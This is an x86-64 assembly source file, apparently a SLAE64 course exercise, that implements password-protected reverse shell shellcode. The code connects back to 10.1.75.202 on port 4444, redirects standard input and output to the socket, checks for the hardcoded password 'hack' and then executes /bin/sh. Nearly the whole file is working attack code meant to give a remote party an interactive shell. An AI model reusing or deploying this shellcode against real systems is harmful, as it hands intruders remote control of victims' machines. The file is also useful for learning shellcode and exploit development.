;Sathish Kumar L SLAE64 - 1408

global _start

_start:
    jmp sock
	prompt: db 'Passcode' ; initilization of prompt data
   	; sock = socket(AF_INET, SOCK_STREAM, 0)
	; AF_INET = 2
	; SOCK_STREAM = 1
	; syscall number 41 

sock:
	xor rax, rax    ;Xor function will null the values in the register beacuse we doesn't know whats the value in the register in realtime cases
	xor rsi, rsi 
	mul rsi       
	push byte 0x2   ;pusing argument to the stack
	pop rdi         ; poping the argument to the rdi instructions on the top of the stack should be remove first because stack LIFO
	inc esi         ; already rsi is 0 so incrementing the rsi register will make it 1
	push byte 0x29  ; pushing the syscall number into the rax by using stack
	pop rax
	syscall
	
	; copying the socket descripter from rax to rdi register so that we can use it further 

	xchg rax, rdi
	
	; server.sin_family = AF_INET 
	; server.sin_port = htons(PORT)
	; server.sin_addr.s_addr = INADDR_ANY
	; bzero(&server.sin_zero, 8)
	; setting up the data sctructure
	
	xor rax, rax
	push rax                         ; bzero(&server.sin_zero, 8)
	mov ebx , 0xca4b010a             ; ip address 10.1.75.202 is used if there is any nulls values generated in the ip address use can not or xor to eleminate those things
	mov dword [rsp-4], ebx
	sub rsp , 4                      ; adjust the stack to make the argument in order
	push word 0x5c11                 ; port 4444 in htnos values in hex
	push word 0x02                   ; AF_INET
	push rsp
	pop rsi

    ; connecting to the remote ip
    push 0x2a
    pop rax
    push 0x10
    pop rdx
    syscall
    
	
	; initilization of dup2
	push 0x3                           
	pop rsi								; setting argument to 3 



duplicate:
    dec esi                            
    mov al, 0x21                       ;duplicate syscall applied to error,output and input using loop
    syscall
    jne duplicate
    
Prompt:
   
	xor rax, rax                      
	inc al                             ; rax register to value 1 syscall for write
	push rax	
	pop rdi							   ; rdi register to value 1
	lea rsi, [rel prompt]
	xor rdx, rdx                       ; xor the rdx register to clear the previous values
	push 0xe
	pop rdx
	syscall
	
									   ; checking the password using read
password_check:
	
	push rsp
	pop rsi
	xor rax, rax   ; system read syscall value is 0 so rax is set to 0
	syscall
	push 0x6b636168 ; password to connect to shell is hack which is pushed in reverse and hex encoded
	pop rax
	lea rdi, [rel rsi]
	scasd           ; comparing the user input and stored password in the stack
	jne Exit	  




execve:                                      ; Execve format  , execve("/bin/sh", 0 , 0)
     xor rsi , rsi
     mul rsi                                 ; zeroed rax , rdx register 
     push ax                                 ; terminate string with null
     mov rbx , 0x68732f2f6e69622f            ; "/bin//sh"  in reverse order 
     push rbx
     push rsp
     pop rdi                                 ; set RDI
     push byte 0x3b                          ; execve syscall number (59)
     pop rax
     syscall

Exit:

	 ;Exit shellcode if password is wrong
	 push 0x3c
	 pop rax        ;syscall number for exit is 60
	 xor rdi, rdi 
	 syscall
